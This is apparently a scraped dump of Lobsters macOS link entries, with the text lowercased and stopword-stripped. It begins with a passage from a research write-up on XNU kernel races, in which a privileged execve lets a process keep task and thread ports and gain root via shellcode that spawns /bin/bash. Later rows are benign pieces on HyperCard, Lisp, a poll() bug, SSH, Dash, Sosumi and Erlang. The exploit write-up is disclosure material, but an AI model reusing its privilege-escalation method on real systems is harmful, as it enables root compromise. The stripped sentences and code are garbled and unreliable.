actually create new task struct even executes privileged suid binary modifies existing task struct inplace object previously taskt pointer one privileged task temporal memory safety useafterfree involved let look detail large problem xnu xnu neither unix mach pure mach microkernel invalidating old task port would sufficient prevent process maintaining control task across privilegeescalating exec xnu microkernel earlier looked kernel function convertporttotask take mach task port convert task struct pointer pointer used passed around within kernel without overhead sending message example iokit want manipulate virtual memory process rather send mach message machvm mig subsystem could theoretically instead directly call responsible kernel function another way think mig subsystem live kernel iokit machvm task thread semaphore etc directly linked simply call target function rather going via mig ipc layer obviously massively faster come cost every taskt pointer potential security bug tradeoff central point access resource cut kernel invalidate task port privileged exec happens expect work kernelinternal mig subsystem use task port translate task port task struct pointer userkernel boundary kernel idea kernel pointer task task struct hope invalidate much bigger problem original reference counting bug privilegeescalating exec take place execve create new process task struct stay privilege change mean every single taskt pointer kernel potential security bug locking mechanism let assert privilege task struct changed since got access kernel code got access task struct one time mean access later heap rewriting iosurface exploit actually need slightly tweak original iosurface exploit work even correct taskreference owningtask call instead child passing task port back parent instead create iosurfacerootuserclient child correctly using child task port pas userclient port back parent child execve suidroot binary set euid task without freeing task struct parent still send right iosurfacerootuserclient userclient owningtask euid parent proceed blocking child mapping target libc data segment overwriting function pointer unblocking child try exit executes rop stack new exploit also defeat mitigation added stop creation userclients task task port note failure case exploit race win useafterfree could go wrong exploit work o x version primitive slightly le powerful use free could break restrictive sandbox need call execve iokit object store taskt pointer heap really top iceberg though stack exploiting taskthreads back closer userkernel boundary soon convertporttotask converted task port received userspace task struct pointer task could exec suidroot entitled binary increase privilege even task struct pointer stored heap could still exploitable bug case kernel mig taskthreads method kernreturnt taskthreads taskt targettask threadactarrayt actlist machmsgtypenumbert actlistcnt given send right task port method return send right thread port thread task snippet mig autogenerated code kernel targettask convertporttotask headmsghrequestport retcode taskthreads targettask threadactarrayt outp actlistaddress outp actlistcnt taskdeallocate targettask see task port converted underlying task struct pointer stored targettask local variable life duration function call relevant code taskthreads taskthreads taskt task threadactarrayt threadsout machmsgtypenumbert count thread threadt queuefirst task thread actual thread threadt queuenext thread taskthreads threadreferenceinternal thread threadlist j thread actual ipcportt threadlist convertthreadtoport threadlist code iterates list thread collecting struct thread pointer convert struct thread thread port return handful lock code relevant happens task execing suid root binary time relevant part exec code two point ipctaskreset ipcthreadreset void ipctaskreset taskt task ipcportt oldkport newkport ipcportt oldsself ipcportt oldexcactions exctypescount int newkport ipcportallockernel newkport ipnull panic ipctaskreset itklock task oldkport task itkself oldkport ipnull itkunlock task ipcportdeallockernel newkport return task itkself newkport oldsself task itksself task itksself ipcportmakesend newkport ipckobjectset oldkport ikonull ikotnone followed call ipcthreadreset ipcthreadreset threadt thread ipcportt oldkport newkport ipcportt oldsself ipcportt oldexcactions exctypescount booleant hasoldexcactions false int newkport ipcportallockernel newkport ipnull panic ipctaskreset threadmtxlock thread oldkport thread ithself oldkport ipnull threadmtxunlock thread ipcportdeallockernel newkport return thread ithself newkport let call process exec process b process calling taskthreads process imagine following interleaving execution targettask convertporttotask headmsghrequestport get pointer process b task struct stack b ipckobjectset oldkport ikonull ikotnone b execing suid binary invalidates old task port longer task struct pointer b thread ithself newkport b allocates new thread port set ipcportt threadlist convertthreadtoport threadlist read convert new thread port object b privileged thread giving privileged thread port send right thread port give complete register control exploit proceeds similar fashion previous two except got thread port directly point rip gadget address rather overwriting function pointer race window quite tight requires particular interleaving execution work check exploit original bug report mitigation round release io brought another round mitigation defeat firstly iokit side userclient lifetime directly tied creating task secondly mitigation ipckobject server detect mig kernel method raced execve syscall force method fail race detected check port task port task port snapshot task exec token mig routine call ipcportt port request ikmheader msghremoteport ipvalid port ipkotype port ikottask task convertporttotaskwithexectoken port exectoken ptr routine request ikmheader reply ikmheader check exec token changed mig routine task tasknull exectoken task exectoken exectokenchanged true taskdeallocate task three flaw mitigation inspects first argument kernel mig method take task port different position check task port issue also affect threadports similar way mitigates case bug need get resource returned mig call eg port plenty method actually directly modify process state rather returning new port exploiting round mitigation although longer directly get new thread port via taskthreads still roundabout way get need api modifies state rather directly returning something useful like task port u tasksetexceptionport allows u set exception port task exception raised example accessing invalid memory kernel send exception message registered exception handler importantly u exception message contains task thread port thread caused exception like almost place kernel taskt stack api vulnerable race condition process keep calling tasksetexceptionports passing b task port b execve suid binary miginternal novalue xtasksetexceptionports machmsgheadert inheadp machmsgheadert outheadp task convertporttotask headmsghrequestport outp retcode tasksetexceptionports task exceptionmask newportname behavior newflavor taskdeallocate task kernreturnt tasksetexceptionports taskt task exceptionmaskt exceptionmask ipcportt newport exceptionbehaviort newbehavior threadstateflavort newflavor itklock task firstexception exctypescount exceptionmask oldport task excactions port task excactions port ipcportcopysend newport task excactions behavior newbehavior task excactions flavor newflavor task excactions privileged privileged itkunlock task process b call execve exec privileged suid binary ipctaskreset taskt task itklock task iplock oldkport ipckobjectsetatomically oldkport ikonull ikotnone task exectoken ipunlock oldkport ipckobjectset newkport ipckobjectt task ikottask firstexception exctypescount task excactions privileged oldexcactions task excactions port task excactions port ipnull itkunlock task looking following interleaving task convertporttotask headmsghrequestport b itklock task ipckobjectsetatomically oldkport ikonull ikotnone task excactions port ipnull itkunlock task itklock task task excactions port ipcportcopysend newport race condition far easier win taskthreads case lock make sure everything line nicely u need call tasksetexceptionports loop hope get called b take task lock practise exploit win race millisecond final trick actually make sure win race force child cause exception send u task thread port calling setrlimit rlimitstack small value execing suid target mean binary run tiny stack almost immediately segfault parent tasksetexceptionport call failed try receive exception port short timeout message received race message contains task thread port euid process case exploit allocates rwx memory task copy shellcode stub struct rlimit lim setrlimit rlimitstack lim setuid char argv binbash execve binbash argv shellcode set stack size back large value setuid prevent bash dropping privilege executes shell exploit work reliably version macosos x final fix easy bug class fix due design xnu taskt pointer everywhere underlying issue affect taskt thread suffer issue apple decided refactor execve code allocate new task thread structure loading binary fix underlying issue considerable amount work kudos apple engineering effort put fixing bug look forward release macos xnu source see new code
520,Lobsters,mac,Apple macOS,The @adafruit unboxing of the NeXT box!,https://www.youtube.com/watch?v=5kkYYCcK8_4,adafruit unboxing next box,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature deskofladyada adafruit unboxing next box adabox youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature deskofladyada adafruit unboxing next box adabox youtube
521,Lobsters,mac,Apple macOS,GUIdebook: Screenshots from Mac OS 9,http://guidebookgallery.org/screenshots/macos90,guidebook screenshots mac o,,
522,Lobsters,mac,Apple macOS,25 years of HyperCard—the missing link to the Web,http://arstechnica.com/apple/2012/05/25-years-of-hypercard-the-missing-link-to-the-web/,year missing link web,update old macintosh soon eulogy clarisworks confessed approach computer lib computer chronicle program compuserve theodore nelson neverfinished project xanadu computer libdream machine unveiled project busily worked unix grant national science foundation explained,computer lab beyond cyberpunk hypercard stack update memorial day weekend u ar staff long weekend accordingly many spend time relaxing traveling family maybe someone dust old macintosh fire hypercard beloved bit apple software development kit preweb era application turn later summer staff thought time resurface look hypercard legacy piece originally ran may hypercard approached anniversary appears unchanged sometime around landlady cut deal would purchase macintosh computer would buy external hard drive would leave system living room share used device since computing ibm wanted keep apple development set mac sat one evening noticed program application menu hypercard wondered opened app read instruction hypercard allowed create stack card visual page macintosh screen could insert field card showed text table even image could install button linked individual card within stack played various sound user clicked mostly notably boing clip day ca nt get mind could also turn picture button hypercard included scripting language called hyper talk nonprogrammer like could easily learn allowed developer insert command like go play sound dissolve component hypercard array intrigued began composing stack none amounted anything doodlepacked matrix image sound aphorism eventually glanced wrist watch startled quite tired turned vision stack button dancing head month glanced historical watch hypercard soon noticed editor note turn ever happened searched around found venture entrepreneur coder tim oren eulogy program written week apple withdrew software market hypercard problem argued apple never quite figured software thing oren wrote programming user interface design tool lightweight database hypertext document management system multimedia authoring environment apple never answered question cupertino company exiled program claris subsidiary got lost amidst prominent project like filemaker clarisworks office suite hard core supporter particularly educational community kept alive apple reabsorbed claris sufferance oren epitaph continued even cancellation hypercard inventor saw end coming angstfilled interview bill atkinson confessed big mistake figured stack could linked cyberspace installed particular desktop thing would different missed mark hypercard atkinson lamented grew boxcentric culture apple grown networkcentric culture like sun hypercard might first web browser blind spot apple prevented making hypercard first web browser hypercard may first web client anniversary release approach think deserves prominent place history internet computer lib original hypercard disk year hypercard unveiling san franciscobased television show computer chronicle produced program software host episode quickly identified program inspiration hypercard based upon hypertext gary kildall told stewart cheifet concept developed ted nelson doug engelbart sixty basic idea trying research kind subject subject matter exists kind different place book magazine tape recording compuserve somehow link stuff electronically click beethoven sudden jump one next hypertext hypercard bird theodore nelson proposed hypertext concept early tried implemented neverfinished project xanadu undaunted nelson morphed eloquent evangelist idea book computer libdream machine defined hypertext form writing branch perform request best presented computer display screen simplifying process dispersing accessing information hypertext hypermedia could liberate society nelson saw overprofessionalized digital information elite hypercard jazz hipster saying go war important left general nelson wrote guardianship computer longer left priesthood priesthood actually pretty good job cutting technology loose three year release computer lib architect defense department prototype version project public event washington dc meanwhile two engineer bell lab busily worked unix operating system would become backbone net fearing antitrust reprisal government strayed software marketing business leased unix college university bargain basement rate school supported grant national science foundation built hundred thousand arpanet node took internet programmer cern switzerland huge physic laboratory proposed kind hypertext network use site system available today use single database tim bernerslee explained accessed many user using distributed file system product take ted nelson idea wide docuverse literally allowing link node different database bernerslee determined build one
523,Lobsters,mac,Apple macOS,The Long View: Macintosh Common Lisp,http://basalgangster.macgui.com/RetroMacComputing/The_Long_View/Entries/2013/2/17_Macintosh_Common_Lisp.html,long view macintosh common lisp,xlisp mclide google code rmcl basalgangster macguicom,â â â early two advanced computer language widely promoted language futureâ one new indicated number nameâ language oldtimerâ lisp invented john mccarthy well known world since deeply committed following within artificial intelligence community yet gained widespread commercial use old considered invented ahead time yet realized full potential â â â although often mentioned together two computer language opposite number waysâ smalltalk designed intended used graphical display yet commonly availableâ inventor pictured language eventually used child fun educationâ lisp invented time computer program written card punch machine ran glass room air conditioning built floorâ lisp designed graphical language use child designed study human reason language intelligence development funded military wanted use military purposesâ culturally lisp world apartâ lisp like â â â lisptourist lispevangelist try convince lisp one way otherâ lot written alreadyâ syntax different language turn lot people away itâ okay isâ want add lisp write like â parenthesis obligatoryâ seem repulsive â many people seem think seriously different usual way writing probably like write forth postscript programmer three pretty much cover possibility one much natural familiar â lisp reasonsâ way function argument expects function call list formâ lot people respect consider lisp greatest computer languagesâ enough reason get past parenthesis give closer lookâ parenthesis putting plus operator first intolerable ca nt get past well lisp nothing say â â â slightly deeper problem might lispâ much issue language rather way people write itâ get feel difference smalltalk lisp could compare lovely playfully illustrated book smalltalk adele goldberg published official book lisp guy steele published following yearâ common lisp guy steele actually great bookâ copy second edition came copy macintosh common lisp long time agoâ still like lot nowâ first time opened freaked outâ serious allbusiness specification language complete numerous statement change made standard committee book going print course language reference introductionâ book beginner much easier going lisp language designed computer language theoretician purposesâ ca nt write without discussing pro con dynamic versus lexical scoping difference applicative normal order evaluationâ eventually programmer need understand theoretical idea underlie design language useâ maybe better get practical experience first get book program c start lighthearted way teaching write hello world â done nt learned much programming c learned programming c nt hardâ way even though nt really know thing beginner book lisp start comparing code evaluating factorial using head recursion versus tail recursionâ starting learn programming needed fulfill particular practical need may exactly looking hand experience programming want understand really would wise pick copy steele book learn lisp theory go itâ moreover lisp like smalltalk interpreted least seems way use interactive programmerâ make great learning toolâ lisp certain style seen everywhere programming lisp like writingâ write short complete sentence one tried tested make sentence work satisfaction go next piece program executed timeâ like smalltalk lisp debugging facility built right language lisp pc hard â â â lisp implementation always starved resource lisp us lot memory memory plentiful kind computer early daysâ early thawing ai winter released lot new funding artificial intelligence application lot went toward buying expensive specialized computer equipment designed speed execution lispâ specialized computer called lisp machine made handful commercial vendor eye industry government research operation serious lisp user usually tried get access could otherwise used timesharing mainframe system lisp implementationsâ company creating lisp implementation general purpose minicomputer increasingly also workstation market putting minicomputerstrength equipment relatively small box desk scientist engineersâ prominent among lisp software company lucid franz â â â dramatic success ibm pc early obvious would someday lisp implementation personal computersâ limitation early pc bit processor hobbled memory addressing scheme meant lisp running pc would little toyâ â lisp take pc computer bit flat addressing space became plentiful late macintosh despite wellknown limitation used motorola cpu used many engineering workstationsâ original macintosh byte memory pc time number third party memory expansion kit available almost immediatelyâ apple announced memoryenhanced macintosh within month available fall seen way macintosh powerful pc rather small inexpensive workstationâ reason think could used lisp platformâ â lisp mac â â â availability lisp environment macintosh tracked page mactutor magazine contributing editor andy cohen hughes aircraftâ issue mactutor june â andy wrote first lisp listener column describing prospect lisp computing macintoshâ point lot work done finished product actually availableâ david belz offering xlisp still development unfinished admittedly yet fully functionalâ xlisp finished still around run variety platform including mac o x â â â next issue mactutor â andy described prerelease version first commercial version lisp called experlispâ expertelligence company behind experlisp belonged toâ denison bollay would continue offer groundbreaking macintosh lisp product beginning experlisp uniquely macintosh productâ first version three kind window listener window text editor window graphic window program could draw graphic using version turtle graphicsâ experlisp cost seemed like lot expectation highâ coming market quickly natural still little buggy also would rapid succession version sporting different featuresâ would would myriad product name experlisp experlogo expercommonlisp experprologâ implementation criticized incomplete version languageâ common lisp large language lot featuresâ first macintosh version might expected implement entire thing user porting working program macintosh expected workâ eventually expertelligence would obtain distribution license procyon lisp complete common lisp basic system cost full system â time apple purchase coral allegro common lisp overshadowing everyone elseâ expertelligence offered number amazing lisp product including great class browser gui generator action â â â macscheme second commercial lisp macintosh written clinger john ulrich liz heller eric ost offered semantic microsystems starting august scheme modernized simplified version lispâ better suited implementation small computer macscheme well received time surprisingly functional version lisp ran early macintosh computer despite limitationsâ macscheme well suited educational purpose semantic microsystems offered student version widely used undergraduate computer science course â â â desirable feature macintosh programming system day direct access rom toolbox ability make standalone doubleclickable application experlisp offered direct toolbox access early wrapped toolbox interface lisp looked much like way thing described inside macintosh eg paintoval top left bottom right macscheme offered version called macschemetoolbox also offered lisp wrapper practically call macintosh rom toolbox version possible make complete macintosh program using macschemeâ making standalone application tougher problemâ could store snapshot heap could started doubleclicking lisp interpreter runtime essentialâ solution basically distribute stripped version lisp runtime embedded application lisp system eventually offered facilityâ commercial program actually created wayâ coral allegro common lisp â â â coral software cambridge massachusetts introduced complete common lisp implementation macintoshâ soon afterward entered joint development agreement franz product renamed macintosh allegro common lisp match branding rest franz lisp lineâ macintosh product implementation franz allegro common lisp product ran minicomputer independently developed macintoshonly implementationâ promoted lisp cdr u unique claimed implement every single common lisp feature described guy steele bookâ cost another important feature inclusion objectoriented language extension use implement support macintosh toolboxâ instead providing set lisp syntax wrapper macintosh toolbox call user interface feature like window menu implemented objectsâ coral eventually expanded product line three program fullfeatured allegro common lisp inexpensive stripped version called pearl lisp object logoâ apple acquired coral rebranded allegro common lisp apple macintosh common lispâ apple included pearl lisp phil dave excellent cd one first apple developer cdrom series last seen itâ macintosh common lisp lived went series change descendant still available today lisp object â â â able access toolbox make real macintosh program lisp great really wantedâ really wanted lisp make easier write macintosh programâ everybody knew hard write user interface code procedural languagesâ solution discovered xerox parc use object oriented language object representing user interface elementsâ wayâ lisp originally objectoriented languageâ advantage object became clear several competing objectoriented extension appearedâ first version macintosh common lisp included one called object lisp designed lisp machine maker specialized computer running lisp â two object system play time â one called new flavor developed symbolics corporate relative competitor lisp machine one called commonloops xerox parcâ meeting among proponent new flavor commonloops led release specification new system called common lisp object system clos â seeing writing wall â mcl team wisely replaced object lisp common lisp object system version macintosh common lispâ â â â lisp different kind language come surprise way object implemented lisp different objectoriented extension pascal câ unlike language clos employ message passing objectsâ instead function operate object called generic function look behave like function lisp â except object parametersâ addition making manipulation object look like rest lisp mean generic function passed argument functionsâ ability central philosophy practice lisp programmingâ generic function live exclusively within namespace class exclusive access object instance class variable called slot fact private instance variablesâ slot value accessed freely anyone using generic function called slotvalueâ result object like specialized public data type generic function able equivalent thing data typesâ still implementation generic function must classspecific classesâ need implementation generic function used themâ classspecific version generic function called method smalltalk part class specificationâ method special access class instance variable implicitly keyword get access environment class using macro withslotsâ within context created withslots slot variable may addressed simply nameâ like smalltalk class instance variable difference declared time class defined â â â subclass may override method slot superclassesâ happens subclass said shadowed superclass version methodâ smalltalk common instance method explicitly execute code corresponding overridden method superclassâ especially common instance initialization entire chain inheritance may responsibilityâ clos little complex subclass le responsibility explicitly call method superclass method using function callnextmethod different clos full featured sophisticated class object systemâ advanced way macintosh user interface programming lisper ide â â â like pascal c lisp invented time integrated development environment kind ide normally use like microsoft visual studio apple xcode invented think technology pascal c programming system early day macintoshâ except experimental system programmer developed interactive tool relied character graphic displaysâ interactive programming meant using text editor write program command line type command compile execute themâ program usually took file input wrote output file text editor also tool needed evaluate outcome execution emacs text editor developed richard stallman guy steele became standard tool lisp programmersâ emacs text editor builtin command shell need ever leave editor programmingâ emacs written least partly lisp lisp programmer could alter behavior editor shell well writing programsâ change made took effect immediately without ever leaving emacsâ although far used integrated environment programming actually lot lisp programmer use emacs ide even today â â â lisp development relies two program customizable text editor command shell lisp interpreter run command shellâ process used execute lisp expression result error message printed traditionally called listenerâ lisp programmer developed sophisticated characterbased tool help analyze debug program ran inside listenerâ example trace lisp function print listener sequence call made execution function especially useful analyzing execution recursive functionsâ listener also traditionally enters debugger whenever error encountered carry interaction allows user terminate correct call threw errorâ backtrace command debugger could print stack walk call leading errorâ step function actually macro used execute function lisp expression one time â â â lisp programmer tool designed return information lisp function variablesâ creating lisp function variable programmer provide documentation use string embedded inline within codeâ documentation function return string listener â another similar function apropos print call syntax function data type value variable describe inspect print information variable data structuresâ none stuff required graphical display â â â early macintosh lisp implementation looked basically characterbased system fundamentally different emacsâ put text editor listener different windowsâ macintosh common lisp text editor called fred fred resembles emacs deliberately â like emacs fred customizable although within limitsâ lisp expression typed fred window could executed style smalltalk mpw window selecting selecting eval selection eval menuâ listener window likewise designed look familiar oldschool lisperâ author macintosh lisp implementation mostly alumnus mit stanford computer science department loved lisp programming environment used wanted reproduce standard look feel macintosh unlike experlisp macscheme macintosh common lisp moved multiple us separate windowsâ informative function ideal inspect apropos function made available menu item output written special windowsâ likewise macintosh common lisp put many debugger function including stack backtrace window inspect made open special inspect window similar function describe typed output listener usual thing far cry smalltalk code browser thinkstyle debugger lisp programmer accustomed thing wayâ seems little sparse debugging facility lisp programmer available pregraphical era pretty good sure seemed like working motorcycleâ â â â â programming environment macintosh common lisp change much version continues relatively mac o x offspring rmcl clozure common lispâ fact user interface macintosh common lisp popular separated rest program developed use wide range lisp implementation project called mclideâ seems little strange although must seemed great understand environment considered enough todayâ lisp large language many builtin functionsâ programmer write lot function applicationsâ seems would desirable much interactive tool apropos documentation look name vaguelyremembered function difference equality predicate eq eql equal etcâ also seems lisp programmer would want class browser class use make closâ thing sortâ â lisp programmer certainly capable making tool like wanted themâ incredibly great set browser analysis tool built macintosh version lispderived language dylan apple cambridge group built maintained mcl coincidence thing part lisp ides figure user interface tool â â â macintosh common lisp included lisp implementation simple gui builderâ primitive showed kind thing doneâ earlier version called so interface â written using experlisp jeanmarie hullot worked national institute research computer science parisâ hullot went work expertelligence continue work interface builder got chance demonstrate steve job work creating next computerâ job hired hullot built similar program also called interface builder objectivec programming environment next released probably coincidence interface builder first built macintosh using lisp lightweight gui builder came mcl illustrates reason whyâ usual way programming macintosh connection user interface item like button menu code executed present source codeâ made program runningâ data defined user interface element stored resource identification numberâ nothing resource could directly used execute part programâ programmer would code program look resource particular identification number draw screenâ user clicked button selected menu scrolled scroll bar code look id number resource jump correct subroutine execute commandâ even true macapp except macapp provided programmer easy automatic way look resource id numbersâ interface builder experlisp mcl gui builder source code executed take action interface item included directly data itemâ lisp read compile execute code fly code data stored data describing user interface itemâ user could drag user interface item window palette like resedit execution program rather offline process resembled made famous gui builder included hypercard also released â gui could used soon constructed without even restarting programâ gui builder included mcl could well could also generate lisp code recreate user interface itemsâ could make window menu simple control including button selectable list tablesâ future version added popup menusâ noticeably missing way add scroll bar scrolling windowsâ scrolling something programmer think implement old macintosh way drag mcl use apple â â â apple acquired coral common lisp also acquired creator became cambridge campus apple advanced technology groupâ among gary byers jeremy jones andrew shalit bill st clair gail zachariasâ continued develop macintosh common lisp apple several version developed yearsâ time mcl used number project inside outside apple used create lot commercial programsâ see much used scientific academic circle search macintosh common lisp amazoncom booksâ found book credit mcl include mcl code topic ranging computer sound synthesis geographic information systemsâ book mostly work academic user among mcl popularâ ironic given history lisp lisp machine little macintosh became one popular platform lisp academic circlesâ â â â apple also used macintosh common lisp programming platform several experimental programsâ famous two programming environment dylan dylan advanced objectoriented lisplike language advanced ideâ lisp would expect lisper would make dressed outâ elaborate browser code analysis tool applescriptlike language ide use program prototyping multimedia authoringâ dylan team primarily located cambridge campus overlapped mcl development teamâ developed californiaâ mcl apple â â â apple introduced first computer powerpc processorâ macintosh common lisp program part excellent performance due programmed close metal containing many hacksâ run emulatorâ job porting program turned digitool far find consisted pretty much people coral apple cambridgeâ apple closed advanced technology group including cambridge campus digitool acquired macintosh common lisp continued offer commercial productâ mcl ppc sold package academic price â redistribution license distribute runtime version program written mcl cost additional academic â digitool released first o x native carbon version mcl version powerpc processor version last commercial version mcl released version opensourced still available google code rmclâ run ppc macintosh o x rosetta intel mac snow leopardâ remarkable thing strong resemblance original mcl product year laterâ bad thingâ mcl great program fact lived many life year tribute excellent design â â â mcl run rosettafree version mac o x lion beyondâ lineage coral common lisp continues form clozure common lispâ clozure consists many people coral apple cambridge digitoolâ probably explains clozure common lisp look much like mclâ many tool including backtrace apropos separate window least right lack rest ideâ good new completely rewritten cocoa program bit versionsâ ccl make stand alone program user interface built using really great gui generatorâ move satisfy lisp love recursion clozure chose use program inspired original so interface builderâ interface built ib saved nib filesâ ccl read runtime establish link interface item action way similar way happens objectivec programsâ closure directly creates manipulates cocoa object via straightforward set lisp wrapper objectivecâ â mcl life clozure common lisp bg â basalgangster macguicom
524,Lobsters,mac,Apple macOS,Poll on MacOS 10.12 is Broken,https://daniel.haxx.se/blog/2016/10/11/poll-on-mac-10-12-is-broken/,poll macos broken,curl project discovered poll defined posix wsapoll broken followup january confirmed fixed,mac o x first launched without existing poll function later added poll mac o x quickly discovered broken returned nonzero value asked wait nothing curl project added check configure subsequently avoided using poll o x version including mac o darwin code would instead switch alternative solution based select platform release mac o x maverick october apple fixed poll implementation built libcurl use since issue configure script pick correct underlying function use enter macos yeah called o x anymore sierra released september quickly discovered poll act like back disabling use preference backup solution using select new error look similar old problem nothing wait ask poll wait n millisecond version poll return immediately without waiting causing busyloops problem reported apple radar number news plan act poll defined posix single unix specification specifically say none defined event occurred selected file descriptor poll wait least timeout millisecond event occur selected file descriptor pushed configure check curl part upcoming release also show small snippet use standalone apple hardly alone brokenpoll department remember window wsapoll broken little code snippet detect breakage include pollh include stdioh include systimeh int main void struct timeval int rc sizet u gettimeofday null rc poll null gettimeofday null u aftertvsec beforetvsec aftertvusec beforetvusec u put poll broken return else put poll work return followup january poll bug confirmed fixed macos update released december found official mention statement fact
525,Lobsters,mac,Apple macOS,The Apple Sandbox: Deeper Into The Quagmire,https://www.youtube.com/watch?v=mG715HcDgO8,apple sandbox deeper quagmire,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature hitbgsec sg conference track apple sandbox deeper quagmire jonathan levin youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature hitbgsec sg conference track apple sandbox deeper quagmire jonathan levin youtube
526,Lobsters,mac,Apple macOS,About the Finder... (2003),http://arstechnica.com/apple/2003/04/finder/,finder,introduction secret fundamental philosophical difference forum thread previous mac o x article,introduction secret nt like mac o x finder almost every article written mac o x included litany criticism small annoyance fundamental philosophical difference reader agree criticism disagree nt sure exactly problem even forum thread topic recently post thread represent broad range opinion many center network performance threading issue lot narrower personal concern believe mere existence thread others like indicative larger malaise surrounding mac o x finder past thought finder scattered throughout several article topic never given thorough treatment believe deserves article attempt rectify situation process try answer one common finderrelated question asked reader okay mister smartypants mac o x finder work going outline believe fairly conservative vision finder could explain make better current mac o x finder personally mac user must start defining term historically source controversy confusion surrounding topic previous mac o x article ar technica following mac o x since second developer release earlier article listed reversechronological order major public release bold
527,Lobsters,mac,Apple macOS,macOS Sierra permanently remembers SSH key passphrase by default,https://openradar.appspot.com/28394826,macos sierra permanently remembers ssh key passphrase default,macos sierra permanently remembers ssh key passphrase default rdar comment please note,macos sierra permanently remembers ssh key passphrase default originator fjarlq number rdar date pm status open resolved product macos product classification reproducible always summary upgrading macos sierra using ssh login ssh server noticed passphrase ssh key permanently remembered system rebooting system ssh still know passphrase ssh key need enter passphrase log ssh host anymore permanent storage passphrase done default without prompting find documentation new default feature idea disable restore original el capitan behavior prefer far tell sshadd able manage storage passphrase sshadd l report agent identity even used ssh log server without using passphrase running sshadd report identity removed nt actually true still able log ssh server without entering passphrase indeed idea system passphrase stored assume stored somewhere keychain find using usual method security findgenericpassword ssh security seckeychainsearchcopynext specified item could found keychain security findgenericpassword keychain user username librarykeychainsloginkeychain version class genp attribute blob appleid generic password found nothing ssh step reproduce upgrade macos sierra run sshkeygen generate new ssh key default file location usersusernamesshidrsa passphrase add newlygenerated public ssh key authorizedkeys file ssh server say examplecom run ssh examplecom enter passphrase new ssh key confirm login success reboot run ssh examplecom run sshadd l expected result rebooting expect running ssh examplecom ask passphrase default behavior el capitan prior also el capitan remembered identity could managed sshadd running sshadd l show identity learned sshagent running sshadd cause identity forgotten passphrase required upon next attempt use ssh macos sierra running sshadd l step report agent identity word expect macos remember passphrase default aware optionally run sshadd k cause passphrases stored keychain later run sshadd load identity sshagent never used k option sshadd wish passphrase remembered system actual result rebooting running ssh examplecom log ssh server without requiring passphrase entered version macos sierra version usrbinssh v libressl note bug rdar filed karolylorentey seems related http confused bug seems complaining opposite sshagent remembering passphrases automatically across reboots like el capitan apple developer relation explained new expected behavior run sshadd rc script cause key automatically loaded behavior lorentey complained actually behavior prefer nt understand macos sierra behaved differently comment please note report posted necessarily seen apple problem submitted bugreportapplecom posted please post information radar filed please include apple confidential information post thank
528,Lobsters,mac,Apple macOS,Apple Has Removed Dash from the App Store,https://blog.kapeli.com/apple-removed-dash-from-the-app-store,apple removed dash app store,dash happened dun number update going forward dash macos migrate license,earlier today apple cancelled developer account removed dash app store happened know yesterday sent apple request migrate account individual one company one verified company dun number notified feature itunes connect available account migration later itunes connect account started showing closed apps removed sale thought normal part migration today called confirmed account migration went everything okay far tell hour ago received notice termination email saying account terminated due fraudulent conduct called said provide information update apple contacted told found evidence app store review manipulation something never done apple decision final appealed going forward update dash io anymore distribute outside app store dash macos continue supported outside app store purchased dash mac app store migrate license soon possible moment able download dash app store purchase tab anymore lose access currently activated version dash able migrate license anymore know ifwhen thing go back normal
529,Lobsters,mac,Apple macOS,Little Flocker,https://www.littleflocker.com/,little flocker,,
530,Lobsters,mac,Apple macOS,The Story of Sosumi and the Mac Startup Sound,http://reekes.net/sosumi/,story sosumi mac startup sound,sosumi beep welcome macintosh mac startup sound trademark sound trademark century fox orchestral fanfare nbc chime deep note mac iphone camera sound canon designer apple iconic sound article apple sound jim reekes,true story sosumi beep mac startup sound sound created apple many myth urban legend sound kept secret sosumi decade leaving apple feared truth known would removed happy anyone could imagine sound created still aroundsosumi beep sosumi beepi interviewed documentary history macintosh san francisco gave free beer sadly favorite scene deleted final edit movie fortunately found clip cutting room floor telling real story behind urban legend infamous sosumi beep sound macintoshthis clip movie welcome macintosh next video tell complete version storyvideomac startup sound listen mac startup soundin interesting twist irony love irony sosumi sound came due trademark dispute famous sound officially apple trademark took long sound trademark rare example century fox orchestral fanfare nbc chime also happens based cmajor chord thx deep note final chord beatle day life amazing moment key inspiration mac startup soundhere another interview coffee shop near home jump mark tell story created mac startup soundat tell complete story sosumi beep context new sound added mac system iphone camera sound camera soundone sound created mac one hear take screen shot press also wellknown sound hear taking photo iphone ipadit recording trusty old canon late designer apple iconic soundsthis last video become favorite cnbc contacted asking could come house ask question done apple got show music room filled vinyl record didgeridoo reveal instrument used create mac startup soundvideoarticles apple sound jim reekesi collecting many article work year always surprised much list continues grow interesting people hearing story
531,Lobsters,mac,Apple macOS,Erlang on OS X (beta),https://www.erlang-solutions.com/blog/erlang-installer-a-better-way-to-use-erlang-on-osx.html,erlang o x beta,erlang installer better way use erlang osx motivation change installation usage downloading release setting perk download link direct link webpage conclusion package erlangsolutionscom thought might also interested go back blog,erlang installer better way use erlang osx karol urbanski back joined erlang solution work providing something convenient erlang developer selfcompiled bundle otp apps happy say time managed significantly improve ease deploying erlang variety system especially variant linux recently decided make obtaining erlangotp painless possible o x end recruited wonderful people inaka network help u create better slicker version erlang solution o x installer motivation change previous iteration installer support autoupdating new version come useful feature people like stay cutting edge lot serious developer like stick older version know supported software using moreover looking around company noticed people forgo downloading installer offer indispensable feature ability quickly switch different version many devs important able switch old erlang version order test patch legacy system quickly popping back people keep different version erlang machine decided change esl installer allow kind feature incorporating change make app feel modern installation installation new esl installer easy downloading drag dropping application folder app show tray preference accessed o x system preference usage clicked tray icon expands menu allows download release start shell one release already downloaded force check new release update quickly access preference downloading release release tab installer allows install uninstall various version erlang release providing newest version numbered release since find list missing version would like let u know try provide setting general tab installer allows setup preference including default terminal release like use automatic check update automatically starting installer system boot ensure stay date new thing world erlang perk new installer app look similar o x apps know love instead ugly annoying popup getting much le obstructive notification download link try new installer go direct link webpage conclusion hoping release new comprehensive esl installer convince developer previously found lacking feature try see improves erlang coding experience suggestion feature like see improvement think make give u note package erlangsolutionscom thought might also interested go back blog
